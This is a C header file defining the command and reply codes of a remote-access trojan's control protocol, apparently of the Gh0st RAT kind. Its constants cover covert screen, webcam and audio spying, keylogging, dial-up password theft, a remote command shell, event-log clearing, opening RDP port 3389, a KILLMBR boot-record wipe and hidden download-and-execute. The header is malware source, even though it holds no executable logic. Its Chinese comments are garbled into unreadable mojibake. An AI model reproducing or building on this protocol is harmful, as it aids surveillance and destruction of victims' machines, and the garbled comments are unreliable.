
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE�̤j�]�N256
enum
{
	// ���ǿ�覡
	TRANSFER_MODE_NORMAL = 0x00,	// �@��,�p�G���a�Ϊ̻��{�w�g���A����
	TRANSFER_MODE_ADDITION,			// �l�[
	TRANSFER_MODE_ADDITION_ALL,		// �����l�[
	TRANSFER_MODE_OVERWRITE,		// �л\
	TRANSFER_MODE_OVERWRITE_ALL,	// �����л\
	TRANSFER_MODE_JUMP,				// �л\
	TRANSFER_MODE_JUMP_ALL,			// �����л\
	TRANSFER_MODE_CANCEL,			// �����ǰe
	
	// ����ݵo�X���R�O
	COMMAND_ACTIVED = 0x00,			// �A�Ⱥݥi�H�E���}�l�u�@
	COMMAND_LIST_DRIVE,				// �C�X�ϽL�ؿ�
	COMMAND_LIST_FILES,				// �C�X�ؿ��������
	COMMAND_DOWN_FILES,				// �U�����
	COMMAND_FILE_SIZE,				// �W�Ǯɪ����j�p
	COMMAND_FILE_DATA,				// �W�Ǯɪ����ƾ�
	COMMAND_EXCEPTION,				// �ǿ�o�Ͳ��`�A�ݭn���s�ǿ�
	COMMAND_CONTINUE,				// �ǿ饿�`�A�ШD�~��o�e�ƾ�
	COMMAND_STOP,					// �ǿ餤��
	COMMAND_DELETE_FILE,			// �R�����
	COMMAND_DELETE_DIRECTORY,		// �R���ؿ�
	COMMAND_SET_TRANSFER_MODE,		// �]�m�ǿ�覡
	COMMAND_CREATE_FOLDER,			// �Ыؤ��
	COMMAND_RENAME_FILE,			// ���Τ���W
	COMMAND_OPEN_FILE_SHOW,			// ��ܥ��}���
	COMMAND_OPEN_FILE_HIDE,			// ���å��}���
	
	COMMAND_SCREEN_SPY,				// �̹��d��
	COMMAND_SCREEN_RESET,			// ���ܫ̹��`��
	COMMAND_ALGORITHM_RESET,		// ���ܺ�k
	COMMAND_SCREEN_CTRL_ALT_DEL,	// �o�eCtrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// �̹�����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��w�A�Ⱥ���L���п�J
	COMMAND_SCREEN_BLANK,			// �A�Ⱥݶ«�
	COMMAND_SCREEN_CAPTURE_LAYER,	// �����h
	COMMAND_SCREEN_GET_CLIPBOARD,	// ������{�ŶK��
	COMMAND_SCREEN_SET_CLIPBOARD,	// �]�m���{�ũ���

	COMMAND_WEBCAM,					// �ṳ�Y
	COMMAND_WEBCAM_ENABLECOMPRESS,	// �ṳ�Y�ƾڭn�D�g�LH263���Y
	COMMAND_WEBCAM_DISABLECOMPRESS,	// �ṳ�Y�ƾڭn�D��l���M�Ҧ�
	COMMAND_WEBCAM_RESIZE,			// �ṳ�Y�վ���G�v�A�᭱����INT�����e��
	COMMAND_NEXT,					// �U�@�B(����ݤw�g���}��ܮ�)

	COMMAND_KEYBOARD,				// ��L�O��
	COMMAND_KEYBOARD_OFFLINE,		// �}�����u��L�O��
	COMMAND_KEYBOARD_CLEAR,			// �M����L�O�����e

	COMMAND_AUDIO,					// �y����ť

	COMMAND_SYSTEM,					// �t�κ޲z�]�i�{�A���f....�^
	COMMAND_PSLIST,					// �i�{�C��
	COMMAND_WSLIST,					// ���f�C��
	COMMAND_DIALUPASS,				// �����K�X
	COMMAND_KILLPROCESS,			// �����i�{
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �|�ܺ޲z�]�����A���ҡA���P, �����^
	COMMAND_REMOVE,					// �������
	COMMAND_DOWN_EXEC,				// �䥦�\�� - �U������
	COMMAND_UPDATE_SERVER,			// �䥦�\�� - �U����s
	COMMAND_CLEAN_EVENT,			// �䥦�޲z - �M���t�Τ�x
	COMMAND_Open_3389,				// �W�[�\�� - �}3389
	COMMAND_OPEN_TEST,			    // �䥦�޲z - �ۤv���ե�
	COMMAND_KILLMBR,			    // �t�ά��� - KILLMBR
	COMMAND_OPEN_URL_HIDE,			// �䥦�޲z - ���å��}����
	COMMAND_OPEN_URL_SHOW,			// �䥦�޲z - ��ܥ��}����
	COMMAND_RENAME_REMARK,			// ���R�W�Ƶ�
	COMMAND_REPLAY_HEARTBEAT,		// �^�Ф߸��]


	// �A�Ⱥݵo�X������
	TOKEN_AUTH = 100,				// �n�D����
	TOKEN_HEARTBEAT,				// �߸��]
	TOKEN_LOGIN,					// �W�u�]
	TOKEN_DRIVE_LIST,				// �X�ʾ��C��
	TOKEN_FILE_LIST,				// ���C��
	TOKEN_FILE_SIZE,				// ���j�p�A�ǿ���ɥ�
	TOKEN_FILE_DATA,				// ���ƾ�
	TOKEN_TRANSFER_FINISH,			// �ǿ駹��
	TOKEN_DELETE_FINISH,			// �R������
	TOKEN_GET_TRANSFER_MODE,		// �o����ǿ�覡
	TOKEN_GET_FILEDATA,				// ���{�o�쥻�a���ƾ�
	TOKEN_CREATEFOLDER_FINISH,		// �Ыؤ�󧨥��ȧ���
	TOKEN_DATA_CONTINUE,			// �~��ǿ�ƾ�
	TOKEN_RENAME_FINISH,			// ��W�ާ@����
	TOKEN_EXCEPTION,				// �ާ@�o�Ͳ��`
	
	TOKEN_BITMAPINFO,				// �̹��d�ݪ�BITMAPINFO
	TOKEN_FIRSTSCREEN,				// �̹��d�ݪ��Ĥ@�i��
	TOKEN_NEXTSCREEN,				// �̹��d�ݪ��U�@�i��
	TOKEN_CLIPBOARD_TEXT,			// �̹��d�ݮɵo�e�ũ������e


	TOKEN_WEBCAM_BITMAPINFO,		// �ṳ�Y��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// �ṳ�Y���Ϲ��ƾ�
	
	TOKEN_AUDIO_START,				// �}�l�y����ť
	TOKEN_AUDIO_DATA,				// �y����ť�ƾ�

	TOKEN_KEYBOARD_START,			// ��L�O���}�l
	TOKEN_KEYBOARD_DATA,			// ��L�O�����ƾ�
	
	TOKEN_PSLIST,					// �i�{�C��
	TOKEN_WSLIST,					// ���f�C��
	TOKEN_DIALUPASS,				// �����K�X
	TOKEN_SHELL_START				// ���{�׺ݶ}�l
};


#define	MAX_WRITE_RETRY			15 // ���ռg�J��󦸼�
#define	MAX_SEND_BUFFER			1024 * 8 // �̤j�o�e�ƾڪ���
#define MAX_RECV_BUFFER			1024 * 8 // �̤j�����ƾڪ���

#endif // !defined(AFX_MACROS_H_INCLUDED)